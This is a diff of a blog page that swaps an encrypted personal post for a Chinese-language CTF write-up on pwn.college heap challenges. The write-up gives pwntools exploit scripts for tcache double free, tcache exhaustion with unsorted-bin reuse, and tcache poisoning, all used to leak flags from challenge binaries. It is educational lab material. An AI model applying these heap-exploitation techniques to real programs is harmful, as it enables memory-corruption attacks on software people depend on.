@@ -22,21 +22,21 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"junyu33.me","root":"/","images":"/images","scheme":"Mist","version":"8.1.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
   </script>
-<meta name="description" content="有东西被加密了, 请输入密码查看.">
+<meta name="description" content="指 https:&#x2F;&#x2F;dojo.pwn.college&#x2F;challenges 中的Dynamic Allocator Misuse部分。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="十九——热爱杀105个人的你">
-<meta property="og:url" content="https://junyu33.me/2021/07/09/%E5%8D%81%E4%B9%9D.html">
+<meta property="og:title" content="pwncollege之堆通关记录">
+<meta property="og:url" content="https://junyu33.me/2022/07/03/pwn_college_heap.html">
 <meta property="og:site_name" content="现充|junyu33">
-<meta property="og:description" content="有东西被加密了, 请输入密码查看.">
+<meta property="og:description" content="指 https:&#x2F;&#x2F;dojo.pwn.college&#x2F;challenges 中的Dynamic Allocator Misuse部分。">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-07-09T12:30:00.000Z">
-<meta property="article:modified_time" content="2021-09-27T09:47:44.951Z">
+<meta property="article:published_time" content="2022-07-03T10:00:00.000Z">
+<meta property="article:modified_time" content="2022-07-27T03:10:16.487Z">
 <meta property="article:author" content="丨junyu33丨">
-<meta property="article:tag" content="encrypted">
+<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="https://junyu33.me/2021/07/09/%E5%8D%81%E4%B9%9D.html">
+<link rel="canonical" href="https://junyu33.me/2022/07/03/pwn_college_heap.html">
 
 
 <script class="page-configurations">
@@ -48,7 +48,7 @@
     lang   : 'zh-CN'
   };
 </script>
-<title>十九——热爱杀105个人的你 | 现充|junyu33</title>
+<title>pwncollege之堆通关记录 | 现充|junyu33</title>
   
 
 
@@ -195,7 +195,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -208,6 +208,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap4-1%E2%80%94%E2%80%94tcache-double-free"><span class="nav-number">1.</span> <span class="nav-text">babyheap4.1——tcache double free</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap5-0-amp-5-1"><span class="nav-number">2.</span> <span class="nav-text">babyheap5.0&amp;5.1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyheap6-0-amp-6-1%E2%80%94%E2%80%94tcache-poisoning"><span class="nav-number">3.</span> <span class="nav-text">babyheap6.0&amp;6.1——tcache poisoning</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text"> </span></a></li></ol></div>
         </section>
         <!--/noindex-->
 
@@ -325,7 +326,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://junyu33.me/2021/07/09/%E5%8D%81%E4%B9%9D.html">
+    <link itemprop="mainEntityOfPage" href="https://junyu33.me/2022/07/03/pwn_college_heap.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -338,7 +339,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          十九——热爱杀105个人的你
+          pwncollege之堆通关记录
         </h1>
 
         <div class="post-meta-container">
@@ -349,14 +350,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2021-07-09 20:30:00" itemprop="dateCreated datePublished" datetime="2021-07-09T20:30:00+08:00">2021-07-09</time>
+      <time title="创建时间：2022-07-03 18:00:00" itemprop="dateCreated datePublished" datetime="2022-07-03T18:00:00+08:00">2022-07-03</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-09-27 17:47:44" itemprop="dateModified" datetime="2021-09-27T17:47:44+08:00">2021-09-27</time>
+        <time title="修改时间：2022-07-27 11:10:16" itemprop="dateModified" datetime="2022-07-27T11:10:16+08:00">2022-07-27</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -364,12 +365,12 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
         </span>
     </span>
 
   
-    <span id="/2021/07/09/%E5%8D%81%E4%B9%9D.html" class="post-meta-item twikoo_visitors" data-flag-title="十九——热爱杀105个人的你" title="阅读次数">
+    <span id="/2022/07/03/pwn_college_heap.html" class="post-meta-item twikoo_visitors" data-flag-title="pwncollege之堆通关记录" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -384,14 +385,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.1k</span>
+      <span>1.8k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -402,18 +403,19 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="00edfb9e668526bb87043430ce224abfdc80b0d9f9b6c95221e12d9872b383b7">6fcf1523ddce79b7eefea9a75525b5245de786104bf519d9988408b867bdf551bd0c68bfb36652de0234a851b59b631ffe9d78a9e0290bfff0952c565a4257c23f889a6206ebd9cee2e4e4b13fb740ec11e2312a5d4ceb5e2aadac9c4363471e7bcaf41f992ea7712d75943fde8bfabb64f8ecd8b8076af6711c58d6c1dbdcd520f418c247d8811b10404a981d540156f3d027819ef91d00bfcdb9ef8ec20ec4c3b49909a9255c6e1a1ac04d27a5e8619ce7ff1a57a894ed25be367fd9b33ea0f532221e36c25dd7f263dbb71e97fd06aa61f93bd8bab8d8f46c5f67c48e41957bcec6aa11f7ba3b7431f12306f8466ff0623b1c5324feda48995b26e678e9e87921a5167121673e2eb3fa5bbfd684b0407e5c767e6b0500bdbfb70f00cd93ad0a46181665f3a561a83ff3aa8234311f4017c044a496f25f56485a75332b1048c9412e0a6f1c0df0964a0d35c73cce753d617f76024efd3bfa4b05c889da81d9b965008415d6a819cbbbcefc9e464dd9f0d28a51152f7c05a54d0a8ea6653bfe490ba0c2491a307010940297b5d911a069665ca3d568dba9153877ec40bfd0764ab15ff2d5701066afb9f7063009f4610138b6b055e268428af773398d1d2c03bcd3849554324a95ce4096a998bea71932f96b0a629ae8bcf9853ffde23392b8e9021fd3c7ea939c05547077fd92e3b97460c2160a0fa9ead9aa0e6a7b7e4c151191ed80b8587555307919246a7e9f137dfa4db4311bcba64a9480c7ad409cfa435fe88b5afcb8c51415952671e49c04025195dcedbbd8445b38d8801e4c67946634e42c95c20899386155d0c62cdc74afd04b96be91c1519d893dced0ee421f86c40d14625faa9daaf690814e183cce8958de77443aac4ad52c552f48afae9c7bfd1764c116809f750e542eb89c60a2228ffacf834068c299f86d8dd2e3fd51d5a487cf0706526d81033a48e712cab5fdda79e395c1fa81f19a988ee2b966d1732715e15d96012587ae6417ee72d760c850192f8241192b05eda871743bebfbc7a1a0d25f4f5f6a8d952a91344fdff442ebff524cf13b89697c035fe002c2788ec1b7eb61169e63742c261f05eb3b4050c21b4bf34809b1e96b292f672d4cd3198a276d0d81e782fe4221245c734198d848d2984aa9b7a310bcfb4aca7c1084188af47d8efbcdb33c16a9278a2795275816f15da49c873424bb4fd2892d0e756094dbb00df729a8adb7483c832f27d0f4a84c76d2e7721ec0e1437826df40850ab928eea0492d69d048afa6358a6457c1376e39bd7c7b1247555f778afc030730cfcd816a58748f5e2c0b4e8bd8f1ce135af66abfea8bd6e1f5f3827d55b442dc9a7c58d68080ce7a12e3d2c36d488ff645f4ca4fd6de8afe8a562f70c03b097e63134cf81ec8814a29f51765bff8be523d02e57c55834e6c628afe521ef0bdc9f4cc5c2617d70ef092c913e1dd7700f5898c5cb78a8a309200d87b6c0ca1129671ff666e0c27a6af86040dd9dbe1c66065a909a5707654c1358c6e6232e83f867232d65825794e566309719b4d3a64ee040e884d8ef8afa380e305e2ec828e4f6e7d1dd09a86f534edac5a86060abf820de9ec8ebfa2152fd63e348266569842456060c94ae90dae7e75dc94cb4622c6056892c645367218d2232caa2b3fd99918d2b6f3b9b963acdc78657bf8bb38ce94ef383b60b207f2d3075b152daeb0ddd1020845251a02ef61fc21c71bbdc816adf8da39458850923428da85be819ac524b555b57506b7d3c4ad0b337da2dea1ae5dd42050cf9ab6b907f9b4d8f3c548b373aafb0475da40ee88e803530116de72b38167edcfaa915f67c95d43b8800910889acfc50440218fe1dbf54b9ecebe82d4a18d15e3dc3183ec4efc6e9e9f9470ae555f75fb7d9dbe4225f71ecde89799898e516b0e144b9ac1d346cf683f673b67f8fa6d9e2475e11f61505e5be011e7a56df407ae3b7c3f5c97b3ec8627b6cc10edbf27c720838b8755d2a9449329c1aec5bc00d3c6b602023b6e32efc6f894732db45aafe68acfabf3dfdb5c771a1fc5085cb680cc8806072300d78010909b8f434e86f6bc66fd18894265806a92576c23b71e71eb18765d136e52e63ca2bbaa8da16ceada0b26f0db91e68143b430844191628d1ff27519c532d956f3c50df607d0d6217558e0980119b674335d140bacd3631a04dbbb53c34a38357134c2f560d7dc19f47b593461f2cb309ddc4f85628c581a9b3ba35b162f13e1725807f8b80f194c5b8e64a27daa68684844c6c7ffabdae00328c65d18398e460bae6b1c0dd748e82705ddb3a035afe6d5086262e5aebe9501e96e581e4299caacd8a09fa0d3033500c1caae0f1bacf64745483110d77d5040165869a0e5de48b999017d2f8366f69c92ab928f68c347cc8c8eff3e52317b729d60ed9583c5fc1161af5b6ecf089384616afb74140ad418ac0fe17ccded8e5eb946d22670aa00e45a1649886fbe02256a480f4511c96300039f53c78c22c7d3bc9bd2391915bcf2e79621a7544bbc331f996634a29a7fc9cf5db4a7ab690a940232fe8f19b4d72bd05e85ce8f5b9553c984d2445bcff846b9c5850b2588b87c315eeffcc1cba0ac54dbe633c8cdb244dd0a8119420ec1ff66693f68a71a5923c19161fb5c23325ae61023bcf0094d08a22431583890db2e6fe02d7fd9438fdf793e109904d8a6ab1585b92f52ffcc7570f41a223590497d1e3d1910870c6cd4c8323dfd63606bf5ffa450650273299b297fdb7abe77103ed53bc0a04d6c51148fc6d68732645ce816ccea95027f6d98ea3c032011fdd75a144ebe7fbb18f5dac7e029758bc68179b827108cb53aa59c9e2aa8a924c5a7e5ad8ce4d8e38fd945b5ff7a22210ac6aae08549113d90095f0eaef6356daaf163c23879f84f16edeceabfdab009b9f6ffd4829e3093b0960f9e8e88c69f3e4aee2e98f5c573348eae3e9e27b09133f1095233a3dc9ad8ce175410f7fcf8543e9de96a00032333aae9683a4bbd252a7d01836e0611f961beea850d34d163930633b99fe88b536ed6455210e6460ad2ee02e6e429142d65fb2dd1c510e27d7bb17f467a763844a39af9a15658d6e200d514df9a711b812a2d9ef5bdd33a26279668be8cb4fadd2eecbb8957146327a2a8aff43d4dc67ec4388fc3d7e4467c53fd494a30d259c7f3b0b27d7648b7da88670e664362f655ad971654dbc53b0ffcf24d7e9a1407ec6b0004e88e3711e9b4c3865bd78a486175a05d3714a7871ff65eb82974d814eddcaca78660b453df766e456777bd0c4c4b80b0aa41e02668547330cc9e1009c893cba495400afaead758efdfcb8aa977de27b9a1b6cbc2284636ae38d03926b3b63e16d16cd05c62709cf71e4290866b237f002abc1e3eb36c6642084be64776984c0c5533692ff737ad1baa15bdd106a231ff8d516c5c89c65331e0f204de455f52f91b0690e77e02c9a588c33bf4fe73a211599f79934b1d048524b9aeffc4e341668299d93044f67e3707e111b348da09537ce1b06a9174779b75adff2526eb0ed2c04c37d0cac0d3d44b43007030c8bcb595bfaed4de9eb2b42320a3f45d7dcede75db78573456d057d0c36f81581ee3f5d0dae62fd7e0a55266908d0e4516bedc24f2b750cfb65c80580c3392e429e265b5bf46966347f5a9ac10bbf3a1d3a19845f102f30f821a1eacf6af75ce17b8ad00ba7b6ccf0d4dbe03db6f8ae733e5ecf2036474407a1d612ce6fd192cf7f233e09b87f2c7674bea73fbaff7b74bac3d92e834ee3282e332ec4ccd8e0594b9206448ae182247f0d145da019ee1e899af7a68887f9875a231bb2502bd04e78d4243ff55b11a99e67881ee1e1dd8f2adeb10b747870f2af1517012475b6e07d21ff439f99c14b422f1cf90218567105506b2574364b188e8fc737591804719b87b266e1fd71df3ae085becefcaec498e97946a0cf93feeccbd5bbb59ada2166d4e2fb80a26128f400116541bf8d0e7dfd13c023ec5c6e234eefa20d740b36701465e41bd797c551d64cafe934c746e26b751e63af5ea640b941d4890967183e371c577d05412bba9abb99c5b9118b951a9a4013203b907d794e412fce8f6b5f4a8b5ab37ae915dda58d4abf4db7331b07d4774588db3f9e8176b6464f8131646c316c0f29f8d057cdda0e0c714f9f62aad46253c1d13b5401d554abe729f87a6afb9d54567435b5b0088b6a97ff448eaa82cc0c3f66ec8286101f1516cb633c9fe901b8292c5aa8ce99ebab34ad4ce9d1f8a9c2b6dc196feb569c7264f4894a16a7482147a89a409b9aa09f07758cfb7899646eed737a622980dfae8ed50e60351a9ac47cd62e62a903cb8ffe9cc99ba60c2342d61e39aaf5a200836125a004dbd2f65e6fe30f5037c9222ce4e50ac5758d8cb10068a4ccba68b59e708fdbe507295a1e90dc3ad3336d680d420d8b4af4dba69f624bbc307f67548a9a10a11e5ad37b3097f4cd918b0105a1cad7e992201a3169afd3b05beebcf437c06aa12cd9d2b32c1ca0eed6febe01468d29bb2969228a11f104198dc3db248815de4aaf8f612606eabbec04de8f53f89fe93108449742cf2805519b9c701bf2892227a4802fd6e1f2dbb2f991877f7251714e55675d917d91805f7225b6431729da2d164e0883425bf306b70fc9370b6f75d231b49d346bc2aed7b85f496552736fb598147672f7a1f1b2b5bd1922fa252fa4dc463b2881416977ffa1c43e0502d8b48fb58d1835d1bdc70119f0b292245108b844b1a18d91c37f02626a3e9d00a669b406a0aba59881743f1534d9447662fedbae0b79438a171d7fab5709c8d6d859395d15060bb18add3eae248a544c3312c93f3b2a6d6261d128208e62d3cf06e4b69fc082618dac157e6edbb2b1f9e61dea7e5072374d7041b3a088f6b7d9db7b767c6df144495806d51cadd0c8ebb06ac2d6d590afa60b355f11784fcd232b138f8493bcbe96536839eeb66d30dfc8d90f200a4b4fe7509f8b67e6249dc8f3f56e9b68ac9f3c11199bde2cb63a6a00e7e19e9594edc3c2649ab86d08f4d5c2e7a718b610667fb888dee6d83b012de0d252d0cd694d8af391ddd6eee300178b70dbfb7d576dff399ecc734f28ff20ab785794b2fd330cd4383e4a34a661ab8efb38358efdfebc5289fcc4a04e81af2e74f92f6dfeca667645e6ecf9a3f94b76b44785753e0d680ca023d44874348c19374fa7aba1cc5f34a55cf209106f5e66c544bbc3473af7677ac33ac7b63b479989770d6b36812363883f83ba3aac3b54095ab588366584b2b81fa9840cf50cccda935e7b0c5fa98a58351d7e74e4dc7a28676b590b70bc530f31398b72a2b04dac9b28d47d51ab597bc61a43727478b052ab6c6beb5b6f4a251ed40165a0dd56ea400869561620ef60f785f1ccfe09597b3f176a796af704c06595056fab4aaf2f0eb5b15c22a4b8a0a6b1546c345bef9e2087ace2a54c3106c007e26919221c70ddbe71addbc0473cf74471deb51360703fd94544b2e61104ad67f9ed3920c5f66815719c43e9d70b033f6134872fc6d7fbe8dfbf0e5ba5df043e2baf94822d7aa60652c791f16604844ceabdec26668670b5ae3bed2d8973735bee8bbbabbff7d30126bb7974585b90769da34fd802944f13a4e113375386731a29905be64b6ff82206d45385a572c4d521381519fb2f6d16fad9d066badf37407ce52fd9470d5fd1d3e8c61131c6d389d6a454d5a7ef00642163a11835c5e3f0be9ab5450a30c296cf7a7f39d93f0a6234771c58d6613130ceba442359a4ae24d7ab1c41dcc349a37d2d1e6532b44d785912d42fe4c313329a2df10de608b7fe0ad27640befd7cf113d72b1a1c175f71b2ba2aeabe1272851cf79ec5fc576484bfd567bfe0e84850779ac8ff983abbec205ac963b44f4355faa31e22694bb64dd06cece5e948b4ca474631cc5ad5a04acac1457eda09f3d689c25ba91650f5d66a4e641fdccd76d250a968c13f5a321faf12cc29f5c7bf9b3655d52c60648c22550a8d8586012a1c29bf5471585afc67424cacfac5a8222d2384eb5b1fbed75eb41297de524c45a7bf2bd6e59b63c81315715899960f2c7477d6281bc2d72a1a6ecbd2b9c2b73d9bed20d69beea9a7ef5ebaa0b187105fda89b4236386444a926d0187644fa60f0314cf44a5d294da3e13a97504859a9f6bf8388e73d99d6a7698112bc134786012b47dbba5a316b9a34da98614a775455a9473a2879e7d6a8ca8d734edbb8125077ab09a9f3284436621590edae46c5bbe80667aa6b3c327e24acf92e721845825e98e4d5afde675418a94fa60fa9c02de17f9820e103fd7200ace648f901b3b307db292d879f8dc69a2d19765f8dfee07043e96fd57471052208039e8bffc0eb987b962792b9d3a450d1f6ce3cc69c9298cd337547e8b8328b6df62387262144c909347d96874ad0a312dd12243263b198cbb6c188bb2ac61f29afce658da675014d142d04e62aa906468f7a677b26da78279286dc09fe97bc7047e473ed1577eef7736fcb4d27089acab76b1bd2f4ab4ec15240008c58c57e1d313672b8d23fa7320d7136b25aa03ed22f504696b9b6c6a890f0467ebe261955a8c652171dffff456fdd449be87f9a45d8654583c986f0727388339f8d9c57e6d31d72b114a28391c1291a320c87a81681fcd9f8fd1a01a84956b49aa7811599a6df033cc20357839686ede2a0a1cb4253df0d321be75ccba25a1ec7c6200a152fd762ff3bf5ae4360f76b130fc406b699e716d9b2cc99af905bdf024b577bac22371895b4e3cfa6ea056d7712eab9</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+        <p>指 <a target="_blank" rel="noopener" href="https://dojo.pwn.college/challenges">https://dojo.pwn.college/challenges</a> 中的<code>Dynamic Allocator Misuse</code>部分。</p>
+<span id="more"></span>
+<h2 id="babyheap4-1——tcache-double-free"><a href="#babyheap4-1——tcache-double-free" class="headerlink" title="babyheap4.1——tcache double free"></a>babyheap4.1——tcache double free</h2><p>第一次独立写出堆题，虽然是最简单的那种<code>tcache double free</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;/challenge/babyheap_level4.1&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">menu = <span class="string">&#x27;Function (malloc/free/puts/scanf/read_flag/quit): &#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;malloc&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;439&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line"><span class="comment"># get the pointer of stack</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;scanf&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;12345678&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># overwrite fd pointer</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="comment"># get the location of stack</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;scanf&#x27;</span>)</span><br><span class="line">payload = p64(addr) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># overwrite fd pointer again, make flag allocate here</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;read_flag&#x27;</span>)</span><br><span class="line"><span class="comment"># tcache double free</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(menu, <span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="babyheap5-0-amp-5-1"><a href="#babyheap5-0-amp-5-1" class="headerlink" title="babyheap5.0&amp;5.1"></a>babyheap5.0&amp;5.1</h2><p>先考虑没有tcache的情况：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">2</span>, flag_size)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   read_flag()</span><br><span class="line"></span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size-<span class="number">16</span>)</span><br><span class="line">   puts_flag()</span><br></pre></td></tr></table></figure>
+<p>libc 2.23-&gt;libc 2.31</p>
+<p>通过耗尽所有的tcache来触发small bin和unsorted bin，进而修改chunk。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">      malloc(i, flag_size)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">      free(i)</span><br><span class="line">   free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">      malloc(i, flag_size)</span><br><span class="line"></span><br><span class="line">   read_flag()</span><br><span class="line">   free(<span class="number">7</span>)</span><br><span class="line">   free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">   malloc(<span class="number">7</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">8</span>, flag_size-<span class="number">16</span>)</span><br><span class="line">   puts_flag()</span><br></pre></td></tr></table></figure>
+<h2 id="babyheap6-0-amp-6-1——tcache-poisoning"><a href="#babyheap6-0-amp-6-1——tcache-poisoning" class="headerlink" title="babyheap6.0&amp;6.1——tcache poisoning"></a>babyheap6.0&amp;6.1——tcache poisoning</h2><p>简单的tcache poisoning</p>
+<p><a target="_blank" rel="noopener" href="https://wargames.ret2.systems/level/how2heap_tcache_poisoning_2.31">https://wargames.ret2.systems/level/how2heap_tcache_poisoning_2.31</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, <span class="number">0x80</span>)</span><br><span class="line">   malloc(<span class="number">1</span>, <span class="number">0x80</span>)</span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   scanf(<span class="number">1</span>, p64(sec_addr))</span><br><span class="line">   malloc(<span class="number">0</span>, <span class="number">0x80</span>)</span><br><span class="line">   malloc(<span class="number">1</span>, <span class="number">0x80</span>)</span><br><span class="line">   puts(<span class="number">1</span>)</span><br><span class="line">   p.recvuntil(<span class="string">&#x27;Data: &#x27;</span>)</span><br><span class="line">   send_flag(p.recv(<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
+<h2 id><a href="#" class="headerlink" title=" "></a> </h2>
     </div>
 
     
@@ -430,7 +432,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://junyu33.me/2021/07/09/%E5%8D%81%E4%B9%9D.html" title="十九——热爱杀105个人的你">https://junyu33.me/2021/07/09/十九.html</a>
+      <a href="https://junyu33.me/2022/07/03/pwn_college_heap.html" title="pwncollege之堆通关记录">https://junyu33.me/2022/07/03/pwn_college_heap.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -439,20 +441,20 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/encrypted/" rel="tag"># encrypted</a>
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/07/07/%E5%8D%81%E5%85%AB.html" rel="prev" title="十八——给hash的一封回信">
-                  <i class="fa fa-chevron-left"></i> 十八——给hash的一封回信
+                <a href="/2022/06/24/cxxxt.html" rel="prev" title="（转载）我家跨上了“信息高速路”">
+                  <i class="fa fa-chevron-left"></i> （转载）我家跨上了“信息高速路”
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/07/11/%E8%BD%AC%E8%BD%BD.html" rel="next" title="（转载） 写给OIer们的一些话">
-                  （转载） 写给OIer们的一些话 <i class="fa fa-chevron-right"></i>
+                <a href="/2022/07/06/anniversary.html" rel="next" title="博客一周年祭">
+                  博客一周年祭 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
@@ -541,7 +543,49 @@
 
 
 
-  
+  <script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
